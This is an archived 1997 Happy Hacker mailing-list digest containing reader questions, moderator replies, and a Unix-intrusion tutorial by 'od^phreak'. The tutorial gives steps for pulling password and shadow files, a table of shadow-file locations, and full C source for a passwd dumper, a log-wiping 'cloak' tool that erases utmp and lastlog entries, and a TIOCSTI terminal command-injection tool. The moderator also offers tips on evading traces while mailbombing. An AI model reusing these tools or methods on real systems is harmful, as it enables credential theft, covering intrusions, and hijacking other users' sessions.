@@ -1,0 +1,834 @@
+Happy Hacker Digest Feb. 28, 1997 
+=============================================================================== 
+This is a moderated list for discussions of *legal* hacking. 
+Moderator is Carolyn Meinel. 
+Please don't send us anything you wouldn't email to your friendly 
+neighborhood narc, OK?
+                           
+Better yet, post to the Hackers forum at: http://www.infowar.com/
+
+To subscribe or unsubscribe, just 
+use the subscribe boxes on the menubars. If you decide you 
+just want to use the forum and not get these mailings, I promise my 
+feelings won't get hurt if you unsubscribe from this list. 
+Happy hacking! "Carpe Diem, quam minimum credula a postero" -- Horace 
+===============================================================================
+
+URL of the Day: http://www.nwfusion.com
+
+Our thanks to Peter Beckman (beckman@purplecow.com), who has formatted this Digest.
+
+Table of Contents: 
+   o I've Been Rooted! 
+   o More on Linux 
+   o More Email Bomb Info 
+   o Cracking Question 
+   o Overdosed Unix 
+   o Rants
+
+=============================================================================== 
+I'VE BEEN ROOTED! 
+=============================================================================== 
+   Anonymous:
+
+      Hey there - I was wondering if you could answer something for 
+      me.
+
+      Over the past weekend, some k-rad elitester decided to take over 
+      root on our machine. This happened around 7pm on a Friday, but 
+      luckily, one of our admins was still in the office, realized 
+      what was happening, and pulled the plug for the weekend.
+
+      We were able to regain root, plug the hole where the guy got in, 
+      and (hopefully) got rid of the backdoors he left himself.
+
+      But now I want this guy.
+
+      I've figured out where he came through the wtmp logs, but I 
+      don't know where to go from here. What do you recommend to help 
+      me track him down? Is there any specific files I should be 
+      keeping offline or as a printed record in case proof is ever 
+      needed (and what legal issues surround this - ie: is a file 
+      permissible as evidence)?
+
+      You've covered hacking quite well, care to cover what to do 
+      after being hacked? 
+                                                         M@
+
+   Moderator: 
+  
+      First, did you do a complete reinstall of all executables using 
+      sources dating before the attack? And are you certain of when 
+      the first attack was? Sometimes you can be compromised for a 
+      long time before you realize an intruder has been on your 
+      system.
+
+      It's probably too late now, but ideally the minute you discover 
+      an attack you should take a snapshot of the entire system and 
+      save it on tape. That way you can see not only the logs but also 
+      what files the intruder was reading, etc. (I'm assuming Unix.) 
+      Thus you can get an idea of whether this guy was a basically 
+      harmless hacker looking around, or whether it was someone with 
+      an agenda. Now I don't want to sound like a knee-jerk pro-hacker 
+      type, but according to the FBI, almost no computer crime is 
+      committed by hackers.  So if it was just a hacker, you can 
+      probably relax. But if it was a computer criminal, you may be in 
+      for further attacks.
+
+      To give you more specific info, we need to know exactly what 
+      your operating system is and how it was configured.
+
+=============================================================================== 
+MORE ON LINUX 
+===============================================================================
+
+   Sender: ardhans@juno.com
+
+      Carolyn, just a quick note on 
+      >Anyone know a better way to make Win95 behave with Linux?
+
+      I've found a program called : System Commander 3.0.   I'm not 
+      trying to advertise here or anything but I believe it will do 
+      the trick.  SC3.0 will overwrite your master boot record on your 
+      HD so it'll take control on bootup.  You then decide which of 
+      all the OS's installed (up to 100), you want to run.   It then 
+      shuffles config. files hides partitions and gets outah dah way! 
+      leaving no trace in memory.   You can install OS's in their own 
+      partitions.   It's not perfect but it helps a lot.  Look it 
+      up: 
+        http://www.v-com.com/ 
+      and... Omnia mutantur, nos et mutamur in illis. 
+      Plus de groeten aan alle Nederlanders out there! 
+                                                            ARD
+
+=============================================================================== 
+MORE EMAIL BOMB INFO 
+===============================================================================
+
+   <Please post as Anonymous>
+
+      If Hacking is an Art, then I am still painting by number, so 
+      please don't flame me for my ignorance....  But, I think I know 
+      of a way to avoid Email Bombs in some cases.  Could you not get 
+      a free email forwarding address like the ones available on 
+      BIGFOOT.COM, with a forwarding address to you.  Make your 
+      address on bigfoot something like IDIOT@BIGFOOT.COM (Don't use 
+      your Hacker Handle!).  Then anytime you give out your email 
+      address to people you don't know, give out the bigfoot address. 
+      This way, if you begin to get that initial barrage of emails 
+      from subscription lists, then just change your forwarding 
+      address at Bigfoot to something that doesn't exist.  This 
+      solution is only valid, of course, if the perpetrator doesn't 
+      know your real email address.  Hopefully, this would avoid 
+      frivolous bombings, and serious hackers who could probably 
+      somehow get your real address from Bigfoot's servers would have 
+      bigger and better things to do.
+
+      Sorry about the length...
+
+      IOScream!
+
+   Moderator: 
+  
+      That's what I'm doing in effect with the two email bombings to 
+      right now. This crud is being bounced at 
+      the router.  Hopefully the owners of the email lists that are 
+      bombing me will get tired of the bounced messages and 
+      unsubscribe me. It isn't the most elegant way, but that ISP that 
+      serves that address for me(Highway Technologies) has such 
+      clueless tech support people that they can't do it any other way 
+      and won't let me do it for them.
+
+   Sender: stardust@blueneptune.com
+
+      I have a question/comment regarding port 25 on unix. I've sent bogus mail 
+      thru mirc, i.e: irc.phoenix.net 25 [syntax: /server irc.phoenix.net 25] 
+      and it worked. I can make a mailbomber using the timer commands in 
+      mirc...would this be illegal, do you think this could even be done without 
+      being traced? Don't want to get in trouble... <eg> I would appreciate any 
+      thoughts on this, thanks again!!!
+
+      Got a suggestion... How about arranging a meeting on IRC for the HH list 
+      members (moderated hopefully)? TTYL, If I have something worthy to say!
+
+      -- 
+      Anil J., San Jose State 
+      http://www.blueneptune.com/~stardust
+
+   Moderator: 
+  
+      Sheesh, you know how I feel about email bombing! In answer to 
+      your question, email bombing is illegal as a denial of service 
+      attack. But usually the authorities don't prosecute. But email 
+      bombers do get into other sorts of trouble. I have had reports 
+      of email bombers getting kicked off their ISPs and expelled form 
+      school. Now if you were to email bomb a hacker, there are other 
+      unpleasant things that can happen to you.
+
+      As for how to keep from getting caught, you need to use a box 
+      that isn't running identd. But thanks in part to the rash of 
+      email bombing from lots of clueless newbies who imagine it is 
+      elite, sysadmins are quickly installing indentd on all their 
+      boxes. You know those canned email bomb programs you can 
+      download from certain Web sites that I'm working on closing 
+      down? Some of these programs say they will keep you anonymous. 
+      But that isn't true any more because the owners of the boxes 
+      they exploit have installed identd. Also, the authors of these 
+      email bomb programs have installed back doors so people in the 
+      know can track down the people who use them and extract hacker 
+      justice.
+
+=============================================================================== 
+CRACKING QUESTIONS 
+===============================================================================
+
+   From: beast master <beastmstr@geocities.com>
+
+      Is there any way to set up a remotely executable file on a web 
+      site?   for instance, be able to log into the page and launch a 
+      browser?  I know it is possible to use AOL's web browser, 
+      something like that, but just to a web site....
+
+      thanks! 
+      *P* 
+      -- 
+      http://www.geocities.com/SoHo/6660
+
+   Sender: warpy@null.net
+
+      Whilst i was doing a random search of systems with both rpcinfo 
+      -p and showmount -e, i discovered a system which was exporting 
+      their / directory.  This being the first time I've noticed it i 
+      was very careful not to do anything. Am I correct in assuming i 
+      could mount /root if i so wished and thus insert a .rhosts file 
+      which would give me axs?
+
+      Warpy
+
+      (To Carolyn.. Please post this. I'm not looking to cause trouble 
+      on this system, just interested in what I've found. Honestly.. 
+      :)  )
+
+   Moderator:
+
+      If the answer turns out to be 'yes,' I trust that you will 
+      advise the owner of that box? Heck, he or she may even ask you 
+      to please demonstrate how it's done, and then pay you to fix it. 
+      Many people have gotten a start on a lucrative career as a 
+      security consultant by making friends this way. Trust me, it's 
+      more fun using hacker knowledge to make an honest and very 
+      prosperous living than to get thrown in jail. That's how jericho 
+      and evil pete make their livings, right?
+
+=============================================================================== 
+CRITIQUE OF OVERDOSED UNIX 
+===============================================================================
+
+   Sender: jericho@dimensional.com
+
+      > COPY = CP 
+      > MOVE = MV 
+      > DIR = LS 
+      > DEL = RM 
+      > CD = CD
+
+      Wow. If I type exactly that.. none of them work?!?@ (*cough* case 
+      sensitive *cough*)
+
+   Moderator: 
+      (jericho means that while in DOS you can interchange caps and 
+       lower case, in Unix it makes a difference. All those Unix 
+       commands above are lower case: 'cp', 'mv', 'ls', 'rm' 'cd'. But 
+       I wouldn't get too critical of the author, after all, he's the 
+       first person to start posting really detailed explanations to 
+       this list of how to crack into Unix computers.)
+
+   Jericho: 
+      > back!..think for a second now.....does telnet keep logs +NO!+ 
+      > so you would simply type telnet then open target.server.com !!
+
+      What unix are you on? My telnet surely keeps logs.
+
+   Moderator: 
+      (I think he's pointing out that once you are running telnet your 
+       commands no longer turn up in the shell log file.  Look, I 
+       agree, there are a zillion ways your breakin can be logged, but 
+       many sysadmins only look at the obvious.)
+
+      > Now we get to the more difficult part. It's common sense. If 
+      > the system administrator has a file that has passwords for 
+      > everyone on his or her system they are not going to just give 
+      > it to you. You have to have a way to retrieve the /etc/passwd 
+      > file without logging into the system.
+
+      If you are local, they can't help but to give you the passwd 
+      file. It must be 644 for many system binaries to run.
+
+      > 1. Anonymous FTP cd to /etc and get the passwd
+
+      And you will not get the system passwd file.
+
+      > password file. Unfortunately there is no way to "unshadow" a 
+      > password file but sometimes there are backup password files 
+      > that aren't shadowed. Try looking for files such as 
+      > /etc/shadow and other stuff like that.
+
+      There isn't?! On some systems this little script called 
+      "unshadow.c" does wonders.
+
+      > Also another method is the oldest most famous way the good old 
+      > command just type. 
+      > ypcat /etc/passwd 
+      > NOTE: doesn't always work
+
+      Gee, why not?! Why don't you explain "that NIS thing"?
+
+      >   You can do whatever you want to the servers http'd system
+
+      No you can't. You were talking about getting on the system with 
+      a user account.. unless you are root, you basically can NOT mess 
+      with the http server.
+
+      > 3. If you an gain root create your self an account with 
+      > the 'adduser' command.
+
+      Oh yeah! Mr "don't get logged". How about editing the passwd 
+      file directly? Adduser shows up in logs.
+
+      > 4. Type 'who' to see who else is on the system.. usually one 
+      > other hacker on the medium and big ISP'S just look on the far 
+      > right you should see their alphanumeric IP
+
+      English please?
+
+      > NOTE: It's best to hack late at night because root can't type 
+      > who and see you don't have the right IP. Usually he doesn't
+
+      Why not?
+
+      > 8. Type telnet and telnet to another shell account ;) (now 
+      > that's anonymous)
+
+      *cough* all logged *cough*
+
+      =-=
+
+      > Fine. By that argument we need to clear out some 25% of the 
+      > art in museums around the country. Wake up. 
+  
+   Moderator: 
+      (would you care to identify by name any art museum that has even 
+       *one* kiddie porn exhibit, jericho? Are you sure you are on the 
+       right planet?)
+
+   Jericho: 
+      Wewps. I misread that part. I thought it was 'porn' in general. :)
+
+      > We don't know.. do you? 
+  
+   Moderator: 
+      Oh, jericho, I'm so embarrassed to admit this -- no, the FBI has 
+      never even offered to give me money, sob...
+
+   Jericho: 
+      Damn if the rumor mill says otherwise!#@!#@$!
+
+   Moderator: 
+      Maybe that's because I've given out interviews in which I say that 
+      when I have evidence of a *real* computer crime -- not just some 
+      silly kid email bombing me -- I will gladly help the FBI. Thanks to 
+      GALF's habit of wiping system files -- which is real crime -- I've 
+      provided evidence against them. I've told this to Rogue Agent in 
+      private email, too.  I'm against computer crime, got it? But I've 
+      done this only as a free service for the people who have been the 
+      victims of crime, not for pay.
+
+=============================================================================== 
+OVER DOSED UNIX 
+===============================================================================
+
+   Hacking Unix Part 2 
+   by od^phreak
+
+      Hello,
+
+      And welcome to my second edition of hacking Unix. This is for 
+      newbies pretty much but every edition gets more advanced so 
+      young hackers can follow along.and novices can start from the 
+      middle and advanced can read codes,idea's,etc...... 
+      ------------------------------------------------------- 
+      Bypassing Shadowed Passwords And Then Getting Root
+
+      1.Anon Ftp get Shadowed Passwd
+
+      NOTE: these will be shadowed accounts for the administrators of 
+      the Ftp system.so this means if you cant unshadow with step 2 
+      sometimes the defaults will work which are in this passwd,such 
+      as games.  Usually admins don't care to change this so you can login 
+      as games to get the real passwd file you know the big one that is 
+      likely unshadowed.
+
+   2.Run a program Similar to The following code:
+
+/**************************************************/ 
+/* 
+ * unlock .c 
+ * 
+ * Unshadow the Shadow password file 
+ * 
+ */
+
+#include <pwd.h> 
+main() 
+{ 
+   struct passwd *p; 
+   while(p=getpwent()) 
+   printf("%s:%s:%d:%d:%s:%s:%s\n", p->pw_name, 
+   p->pw_passwd, 
+   p->pw_uid, p->pw_gid, p->pw_gecos, p->pw_dir, 
+   p->pw_shell); 
+} 
+/**************************************************/
+
+      Now this is Just a very small Code that will Unshadow on some 
+      systems but there are many larger codes that will work on almost any 
+      system.
+
+      3. Now that you have it unshadowed if you didn't get root or just 
+         want a normal account you can login to a shell as one of the 
+         accounts you cracked.and type
+
+         cat /etc/shadow 
+         or 
+         cat /etc/passwd
+
+         you can look in the following plays for unshadowed backups
+
+   OS type                            Path           Token in = passwd field 
+   -------------------------------------------------------------------------= 
+   AIX 3                       /etc/security/passwd                 ! 
+         or                   /tcb/auth/files/<first letter         # 
+                              of username>/<username> 
+   A/UX 3.0s                   /tcb/files/auth/?/                   * 
+   BSD4.3-Reno                 /etc/master.passwd                   * 
+   ConvexOS 10                 /etc/shadpw                          * 
+   ConvexOS 11                 /etc/shadow                          * 
+   DG/UX                       /etc/tcb/aa/user/                    * 
+   EP/IX                       /etc/shadow                          x 
+   HP-UX                       /.secure/etc/passwd                  * 
+   IRIX 5                      /etc/shadow                          x 
+   Linux 1.1                   /etc/shadow                          * 
+   OSF/1                       /etc/passwd[.dir|.pag]               * 
+   SCO Unix #.2.x              /tcb/auth/files/<first letter        * 
+                              of username>/<username> 
+   SunOS4.1+c2                 /etc/security/passwd.adjunct         = ##username 
+   SunOS 5.0                   /etc/shadow 
+                              <optional NIS+ private secure 
+                              maps/tables/whatever> 
+   System V Release 4.0        /etc/shadow                          x 
+   System V Release 4.2        /etc/security/* database 
+   Ultrix 4                    /etc/auth[.dir|.pag]                 * 
+   UNICOS                      /etc/udb 
+   -------------------------------- 
+      how some people get root on large high security systems was done 
+      with the following Exploits and the above Method.and for the newbies 
+      you would compile these with GCC by typing gcc -0 yourfile 
+      yourfile.c also another common compiler is cc
+
+/*************************************************************************/ 
+/* 
+ * -=-=-=-=-=-=-=-=-=-=- 
+ * Closeit.c 
+ * -=-=-=-=-=-=-=-=-=-=- 
+ * this is a rather kewl exploit to close programs  and delete you 
+ * from system logs 
+ */
+
+#include <fcntl.h> 
+#include <utmp.h> 
+#include <sys/types.h> 
+#include <unistd.h> 
+#include <lastlog.h>
+
+main(argc, argv) 
+ int     argc; 
+ char    *argv[]; 
+ { 
+   char    *name; 
+   struct utmp u; 
+   struct lastlog l; 
+   int     fd; 
+   int     i = 0; 
+   int     done = 0; 
+   int     size;
+
+   if (argc != 1) { 
+         if (argc >= 1 && strcmp(argv[1], "cloakme") == 0) { 
+            printf("You are now cloaked\n"); 
+            goto start; 
+                                                         } 
+         else { 
+            printf("close successful\n"); 
+            exit(0); 
+            } 
+                  } 
+   else { 
+         printf("usage: close [file to close]\n"); 
+         exit(1); 
+         } 
+start: 
+   name = (char *)(ttyname(0)+5); 
+   size = sizeof(struct utmp);
+
+   fd = open("/etc/utmp", O_RDWR); 
+   if (fd < 0) 
+      perror("/etc/utmp"); 
+   else { 
+      while ((read(fd, &u, size) == size) && !done) { 
+            if (!strcmp(u.ut_line, name)) { 
+               done = 1; 
+               memset(&u, 0, size); 
+               lseek(fd, -1*size, SEEK_CUR); 
+               write(fd, &u, size); 
+               close(fd); 
+            } 
+      } 
+   } 
+ 
+
+   size = sizeof(struct lastlog); 
+   fd = open("/var/adm/lastlog", O_RDWR); 
+   if (fd < 0) 
+      perror("/var/adm/lastlog"); 
+   else { 
+      lseek(fd, size*getuid(), SEEK_SET); 
+      read(fd, &l, size); 
+      l.ll_time = 0; 
+      strncpy(l.ll_line, "ttyq2 ", 5); 
+      gethostname(l.ll_host, 16); 
+      lseek(fd, size*getuid(), SEEK_SET); 
+      close(fd); 
+   } 
+} 
+/****************** end **************************************************/
+
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+      Force. 
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+      i didnt write it but i use it 
+      i think its one of the best programs
+
+      Compiles under SGI Irix, SunOS 4.1, Ultrix 3.1D, and Ultrix 4.1. 
+      No promises are made for other OS's or systems.
+
+/*************************************************************************/ 
+/* 
+ * -=-=-=-=-=-=-=-=-=-=- 
+ * force.c 
+ * -=-=-=-=-=-=-=-=-=-=- 
+ * 
+ * Usage: force [ -n ] [ -l /dev/ttyxx ] 
+ *       -n            - use this if you don't want the command to echo 
+ *       -l /dev/ttyxx - the line to hit; use the full name (e.g. = /dev/ttyp0) 
+ * 
+ */
+
+#include <stdio.h> 
+#include <sys/types.h>  /* for stat(2) */ 
+#include <sys/stat.h>  /* for stat(2) */ 
+#include <fcntl.h> 
+#ifdef sgi 
+# include <sys/termio.h> 
+# define termios termio 
+# define TCGETS  TCGETA 
+# define TCSETS  TCSETA 
+#else 
+#include <sys/termios.h> 
+#endif
+
+#ifdef ultrix 
+# include <sys/ioctl.h> 
+# define TCGETS TCGETP 
+# define TCSETS TCSANOW 
+#endif /* ultrix */
+
+void push(), devchk();
+
+extern char *optarg; 
+extern int optind; 
+short no_echo = 0;
+
+#define USAGE     "usage: %s [-n] [-l /dev/ttyxx]\n",*argv 
+#define COMMAND_LIM 100
+
+int 
+main(argc, argv) 
+   int argc; 
+   char **argv; 
+{ 
+int f, cnt; 
+short true = 1, no_cmd = 0; 
+char *device, *buf, *trail, chr;
+
+if (argc > 4) { 
+   fprintf(stderr, USAGE); 
+   exit(1); 
+}
+
+if ((device = (char *)malloc(40)) == (char *)NULL) { 
+   perror("malloc 1"); 
+   exit(1); 
+} 
+if ((buf = (char *) malloc(COMMAND_LIM)) == (char *)NULL) { 
+   perror("malloc 1a"); 
+   exit(1); 
+} 
+while ((chr = getopt(argc, argv, "nl:")) != -1) 
+   switch (chr) { 
+   case 'n': 
+      no_echo = 1; 
+      break; 
+   case 'l': 
+      (void) devchk(optarg, *argv); 
+      device = optarg; 
+      break; 
+   default: 
+      fprintf(stderr, USAGE); 
+      exit(1); 
+   }
+
+if (strlen(device) < 2) { 
+   printf("Device [form: /dev/ttyxx]: "); 
+   fflush(stdout); 
+   fgets(device, 39, stdin); 
+   /* cut off the trailing return that fgets leaves on */ 
+   if ((*device) && (*(trail=(char *)(device + strlen(device) - 1)) = 
+== '\n')) 
+      *trail = '\0'; 
+   if (strlen(device) > 7) 
+      (void) devchk(device, *argv); 
+   else { 
+      fprintf(stderr, "%s: give full name [e.g. /dev/ttyp0].\n", *argv); 
+      exit(1); 
+   } 
+}
+
+printf("Terminate with '-X-' on a line by itself.\n"); 
+while (true) { 
+   no_cmd = cnt = 0; 
+   chr = *buf = '\0'; 
+   printf("Force> "); 
+   rewind(stdin); 
+   while (((chr=getchar()) != '\n') && (chr != EOF) && (cnt < = 
+COMMAND_LIM)) 
+      *(buf + cnt++) = chr; 
+   if (cnt == COMMAND_LIM) { 
+      printf("Limit of %d characters per command line.\n", COMMAND_LIM); 
+      no_cmd = 1; 
+   } 
+   if (chr == EOF) { 
+      putc('\n', stdout); 
+      exit(0); 
+   } 
+   if (!no_cmd) { 
+      *(buf + cnt) = '\0'; 
+      if (!strcmp(buf, "-X-")) 
+      true = 0; 
+      else if ((*buf != '\n') && (*buf != '\0')) { 
+      if ((f = open(device, O_NDELAY | O_RDWR)) < 0) { 
+         perror("open"); 
+         exit(1); 
+      } 
+      push(f, buf); 
+      close(f); 
+      } 
+   } 
+} 
+}
+
+void 
+push(f, s) 
+   int f; 
+   char *s; 
+{ 
+register int i; 
+char ret='\n'; 
+struct termios termios;
+
+if (no_echo) { 
+   if (ioctl(f, TCGETS, &termios) < 0) { 
+      perror("ioctl 1"); 
+      exit(1); 
+   } 
+   termios.c_lflag &= ~ECHO; 
+   if (ioctl(f, TCSETS, &termios) < 0) { 
+      perror("ioctl 2"); 
+      exit(1); 
+   } 
+}
+
+if (ioctl(f, TCFLSH, 0)  < 0) {  /* flush the input queue */ 
+   perror("ioctl 3"); 
+   exit(1); 
+}
+
+for (i = 0; i < strlen(s); i++)              /* give 'em the command = 
+*/ 
+   ioctl(f, TIOCSTI, s + i); 
+ioctl(f, TIOCSTI, &ret);                     /* including a return */
+
+if (no_echo) { 
+   ioctl(f, TCGETS, &termios); 
+   termios.c_lflag |= ECHO; 
+   ioctl(f, TCSETS, &termios); 
+   ioctl(f, TCFLSH, 1);                       /* flush the output queue = 
+*/ 
+} 
+}
+
+void 
+devchk(device, prg) 
+   char *device, *prg; 
+{ 
+struct stat sb;
+
+if (strncmp(device, "/dev/tt", 7) && strncmp(device, "/dev/co", 7)) { 
+   fprintf(stderr, "%s: give full name [e.g. /dev/ttyp0].\n", prg); 
+   exit(1); 
+} 
+if (!strcmp(device, ttyname(0))) { 
+   fprintf(stderr, "%s: you can't force yourself, you masochist.\n", 
+            prg); 
+   exit(1); 
+} 
+if (strlen(device) > 40) { 
+   fprintf(stderr, "%s: terminal name too long.\n", prg); 
+   exit(1); 
+}
+
+/* 
+   * there's probably a cleaner way to do this (not having the struct down 
+   * here at all); I considered using alloca, then decided not to. I'm open 
+   * to suggestions. - BK 11/20 
+   */ 
+if (stat(device, (struct stat *)&sb) < 0) { 
+   perror(prg); 
+   exit(1); 
+} 
+} 
+/* 
+ * -=-=-=-=-=-=-=-=-=-=- 
+ * end force.c 
+ * -=-=-=-=-=-=-=-=-=-=- 
+ */ 
+/*************************************************************************/ 
+      Well i dont want to put to much code here so visit
+
+      http://www.elkhart.net/~sborosh/od/
+
+      for more
+
+      C-ya
+
+      OD^phreak
+
+   Moderator: 
+  
+      These exploits to cover your tracks are certainly better than 
+      what amateurs like the Gray Areas Liberation Front (GALF) use. 
+      The GALF guys simply wipe system files after visiting.  Now on 
+      the one had this means GALF leaves fewer tracks. But on the 
+      other hand it makes their victims mad. Since GALF usually hacks 
+      computers belonging to hackers, these guys are walking down the 
+      same path as the Masters of Deception did. They found out that if 
+      you make hackers mad enough, they start helping the Feds, and 
+      are really good at gathering evidence.
+
+      The problem with even wiping out the system files is that a 
+      record is left at the router of where GALF came in from. So 
+      computer crime detectives go to the computer the router points 
+      to. If that  computer has had its files wiped, we just check out 
+      the computer before that, and so on. We know your modus operandi, 
+      GALF. Are you going to get mad and hack me again for telling the 
+      Happy Hacker list that you aren't elite? Go ahead, make my day!
+
+=============================================================================== 
+*** RANTS *** 
+===============================================================================
+
+   From: Warps <Warps@null.net>
+
+      Speaking as a former newbie who used to hate the f***** 
+      treatment i got from anyone who knew any more than me, i can 
+      tell you all, i'm beginning to understand why i received such 
+      treatment..
+
+      Once you get any sort of knowledge about hacking.. or even just 
+      a good understanding of one or more aspects of it, people begin 
+      to ask you questions. You at first think.. "Hey, I must be 
+      getting better at this, people are asking me the questions instead 
+      of the other way around.." So you answer the questions. Then 
+      more questions come. Because you've answered previous ones you 
+      feel somewhat obliged to answer some more (maybe that's just me 
+      :) ). Anyway what soon happens is that those newbies begin 
+      relying on you and thinking of you as a information tap they can 
+      turn on and off whenever they like. You eventually get more 
+      frustrated as you repeat yourself time and again. But you still 
+      want to help the newbies because not only is it something no-one 
+      did for you, but it makes you "popular".  You answer questions 
+      as fast as they appear, and STILL they want more.  Then one day 
+      someone introduced me to the /ignore command. Ah hh sweet bliss.
+
+      Anyways the point i'm trying to make is that often newbies 
+      attitude towards hacking is "gimme, gimme, gimme". They don't 
+      want to learn the how, only the why. And they won't waste their 
+      own time looking for the info themselves if they can beg it off 
+      someone else. This is the crux of why some hackers are rather 
+      harsh with over enthusiastic newbies. My answer to them is use 
+      the /ignore key often. My advice to newbies is to go find it 
+      yourself!
+
+      Warpy
+
+      BTW,  How do you find out whether a system is running cgi?
+
+   From: "Mad Dog" <maddog@cyberjunkie.com>
+
+      > Moderator: Oh, jericho, I'm so embarrassed to admit this -- 
+      > no, the FBI has never even offered to give me money, sob...
+
+      Ahhhh but Carolyn have they saved you from going to jail in 
+      exchange for information????????
+
+      > Carolyn Meinel 
+      > M/B Research -- The Technology Brokers
+
+      ummmm what *IS* a technology broker??????
+
+      CIAO
+
+      Mad Dog 
+      *presently in Wales UK* see some of you in London for aaa 
+      perhaps???????
+
+   Moderator: 
+  
+      Now I'm *really* insulted! Me, dumb enough to get busted? Hah! 
+      Now if you want to find out what a technology broker really 
+      does, heh, heh, first show me the color of your money.
+
+=============================================================================== 
+To subscribe or unsubscribe, just 
+use the subscribe boxes on the menubars. If you decide you 
+just want to use the forum and not get these mailings, I promise my 
+feelings won't get hurt if you unsubscribe from this list. 
+=============================================================================== 
+                  end Happy Hacker Digest Feb. 28, 1997 
+=============================================================================== 
+  
+ 
+
+-------------------------------------------------------------------------------- 
+Peter Beckman      (c)1997 by Peter Beckman 
+beckman@purplecow.com 
+Webmaster, Northern Virginia Internet Access Cooperative
